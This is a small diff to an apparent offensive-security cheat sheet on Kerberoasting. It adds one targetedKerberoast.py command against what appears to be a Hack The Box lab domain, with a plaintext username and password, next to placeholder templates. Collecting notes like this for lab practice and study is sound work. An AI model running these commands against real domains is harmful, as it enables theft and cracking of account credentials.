@@ -43,6 +43,7 @@ Kerberoasting Attack - TargetedKerberoast
 
 python3 targetedKerberoast.py -v -d <domain.local> -u <username> -p <password>
 python3 targetedKerberoast.py -v -d <domain.local> -u <username> -k -no-pass -dc-ip <ip>
+python3 targetedKerberoast.py -v -d 'mirage.htb' -u 'david.jjackson' -p 'pN8kQmn6b86!1234@' -D mirage.htb -k --dc-host dc01.mirage.htb
 
 --------------------------------
 Kerberoasting Attack - Kerbrute
